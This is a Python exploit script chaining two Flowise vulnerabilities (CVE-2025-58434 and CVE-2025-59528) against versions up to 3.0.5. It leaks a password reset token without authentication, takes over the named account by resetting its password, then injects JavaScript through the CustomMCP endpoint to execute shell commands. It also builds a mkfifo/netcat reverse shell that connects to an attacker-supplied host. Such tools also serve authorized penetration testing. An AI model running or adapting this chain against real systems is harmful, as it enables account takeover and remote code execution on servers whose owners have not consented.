#!/usr/bin/env python3
"""
Flowise CVE-2025-58434 + CVE-2025-59528 Exploit Chain
======================================================
CVE-2025-58434: Unauthenticated password reset token disclosure -> Account Takeover
CVE-2025-59528: CustomMCP node JS injection -> Remote Code Execution

Affected: Flowise <= 3.0.5
Fixed in: Flowise 3.0.6

Usage:
    # Full chain - ATO then RCE (prompts for API key after reset)
    python3 flowise_chain.py -t http://target -e admin@target.com -c "id"

    # Skip ATO - use existing API key directly
    python3 flowise_chain.py -t http://target --api-key <KEY> -c "id"

    # Reverse shell
    python3 flowise_chain.py -t http://target --api-key <KEY> --lhost 10.10.14.1 --lport 4444

Author: For authorized penetration testing only.
"""

import argparse
import sys
import requests
import urllib3

urllib3.disable_warnings()


BANNER = """
 ┌──────────────────────────────────────────────────────────────┐
 │  Flowise CVE-2025-58434 + CVE-2025-59528                     │
 │  Unauthenticated ATO -> CustomMCP RCE                        │
 │  Affected: Flowise <= 3.0.5                                  │
 └──────────────────────────────────────────────────────────────┘
"""


def check_version(target, session):
    try:
        r = session.get(f"{target}/api/v1/version", timeout=10)
        if r.status_code == 200:
            return r.json().get("version", "unknown")
    except Exception:
        pass
    return "unknown"


def parse_version(ver):
    try:
        return tuple(int(x) for x in ver.split("."))
    except Exception:
        return (999, 0, 0)


def get_reset_token(target, email, session):
    """CVE-2025-58434: Leak tempToken from forgot-password response."""
    url = f"{target}/api/v1/account/forgot-password"
    try:
        r = session.post(url, json={"user": {"email": email}}, timeout=10)
        if r.status_code in (200, 201):
            user = r.json().get("user", {})
            token = user.get("tempToken")
            name = user.get("name", "unknown")
            if token:
                return token, name
    except Exception as e:
        print(f"[-] Error requesting reset token: {e}")
    return None, None


def reset_password(target, email, token, new_password, session):
    """Use the leaked tempToken to set a new password."""
    url = f"{target}/api/v1/account/reset-password"
    payload = {"user": {"email": email, "tempToken": token, "password": new_password}}
    try:
        r = session.post(url, json=payload, timeout=10)
        return r.status_code in (200, 201)
    except Exception as e:
        print(f"[-] Error resetting password: {e}")
        return False


def prompt_for_api_key(target, email, password):
    """
    Flowise 3.0.5 reset-password API does not fully update the auth credential,
    so programmatic login after reset returns 401. Prompt the user to grab the
    API key from the UI instead.
    """
    print()
    print("=" * 62)
    print("  MANUAL STEP REQUIRED")
    print("=" * 62)
    print(f"  The password for '{email}' has been reset to:")
    print(f"  Password: {password}")
    print()
    print("  Due to a Flowise 3.0.5 quirk, the API login endpoint")
    print("  doesn't accept the new password immediately. You need")
    print("  to grab the API key from the UI manually:")
    print()
    print(f"  1. Browse to: {target}/login")
    print(f"  2. Login with: {email} / {password}")
    print(f"  3. Navigate to: {target}/apikey")
    print(f"  4. Copy the API key shown on the page")
    print("=" * 62)
    print()
    api_key = input("  Paste API key here and press Enter: ").strip()
    if not api_key:
        return None, None, None
    print()
    print("[*] Now set up a listener for the reverse shell.")
    lhost = input("  Enter your IP (LHOST): ").strip()
    lport = input("  Enter your port (LPORT) [4444]: ").strip() or "4444"
    print()
    print(f"[!] Start listener: nc -lvnp {lport}")
    input("[*] Press Enter when listener is ready...")
    print()
    return api_key, lhost, int(lport)


def build_reverse_shell(lhost, lport):
    """mkfifo reverse shell — confirmed working in JS execSync context."""
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"


def trigger_rce(target, api_key, command, session):
    """CVE-2025-59528: JS injection via CustomMCP node."""
    url = f"{target}/api/v1/node-load-method/customMCP"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {api_key}"
    }
    escaped_cmd = command.replace("\\", "\\\\").replace('"', '\\"')
    mcp_payload = (
        '({x:(function(){'
        'const cp=process.mainModule.require("child_process");'
        f'cp.execSync("{escaped_cmd}");'
        'return 1;'
        '})()})'
    )
    payload = {
        "loadMethod": "listActions",
        "inputs": {"mcpServerConfig": mcp_payload}
    }
    try:
        r = session.post(url, headers=headers, json=payload, timeout=15)
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return 0, "TIMEOUT — reverse shell may have connected"
    except Exception as e:
        return -1, str(e)


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="Flowise CVE-2025-58434 + CVE-2025-59528 exploit chain"
    )
    parser.add_argument("-t", "--target", required=True,
                        help="Target URL (e.g. http://target:3000)")
    parser.add_argument("-e", "--email", default=None,
                        help="Email of target Flowise account (for ATO chain)")
    parser.add_argument("--api-key", default=None,
                        help="Provide API key directly (skips ATO steps)")
    parser.add_argument("-c", "--command", default=None,
                        help="Command to execute (default: id)")
    parser.add_argument("--lhost", default=None,
                        help="Attacker IP for reverse shell")
    parser.add_argument("--lport", default=4444, type=int,
                        help="Attacker port for reverse shell (default: 4444)")
    parser.add_argument("--new-password", default="Pwn3d!2026",
                        help="Password to set on target account (default: Pwn3d!2026)")
    parser.add_argument("-k", "--insecure", action="store_true",
                        help="Skip TLS verification")
    args = parser.parse_args()

    if not args.email and not args.api_key:
        parser.error("Provide either --email (full ATO chain) or --api-key (RCE only)")

    target = args.target.rstrip("/")
    session = requests.Session()
    session.verify = not args.insecure

    # Determine payload
    if args.lhost:
        command = build_reverse_shell(args.lhost, args.lport)
        print(f"[*] Mode:        Reverse shell -> {args.lhost}:{args.lport}")
        print(f"[!] Start listener: nc -lvnp {args.lport}")
        input("[*] Press Enter when listener is ready...")
    else:
        command = args.command or "id"
        print(f"[*] Mode:        Command execution")
        print(f"[*] Command:     {command}")

    print(f"[*] Target:      {target}")
    print()

    # Version check
    print("[*] Checking Flowise version...")
    ver = check_version(target, session)
    parsed = parse_version(ver)
    print(f"[*] Version:     {ver}")
    if parsed > (3, 0, 5):
        print(f"[!] Version {ver} may be patched (fixed in 3.0.6). Proceeding anyway...")
    else:
        print(f"[+] Version {ver} is vulnerable.")
    print()

    # Get API key
    api_key = args.api_key
    if api_key:
        print(f"[*] Using provided API key: {api_key[:16]}...")
    else:
        print(f"[*] Email:       {args.email}")

        # Step 1: CVE-2025-58434
        print("[*] Step 1: CVE-2025-58434 — Requesting password reset token...")
        token, name = get_reset_token(target, args.email, session)
        if not token:
            print("[-] Failed to retrieve reset token. Target may be patched or email not found.")
            sys.exit(1)
        print(f"[+] Got tempToken for user '{name}'")

        # Step 2: Reset password
        print(f"[*] Step 2: Resetting password to '{args.new_password}'...")
        if not reset_password(target, args.email, token, args.new_password, session):
            print("[-] Password reset failed.")
            sys.exit(1)
        print(f"[+] Password reset successful.")

        # Step 3: Prompt user to grab API key from UI, then set up shell
        api_key, lhost, lport = prompt_for_api_key(target, args.email, args.new_password)
        if not api_key:
            print("[-] No API key provided. Exiting.")
            print(f"[!] You can rerun with: --api-key <KEY>")
            sys.exit(1)
        print(f"[+] API key:     {api_key[:16]}...")
        # Override command with reverse shell using the collected lhost/lport
        command = build_reverse_shell(lhost, lport)

    # Step 4: CVE-2025-59528
    print(f"[*] Step 4: CVE-2025-59528 — Triggering CustomMCP RCE...")
    status, response = trigger_rce(target, api_key, command, session)

    if status == 0:
        print(f"[+] {response}")
    elif status in (200, 201):
        print(f"[+] Response ({status}): {response[:300]}")
    else:
        print(f"[-] RCE returned status {status}: {response[:300]}")

    print("\n[*] Done.")


if __name__ == "__main__":
    main()
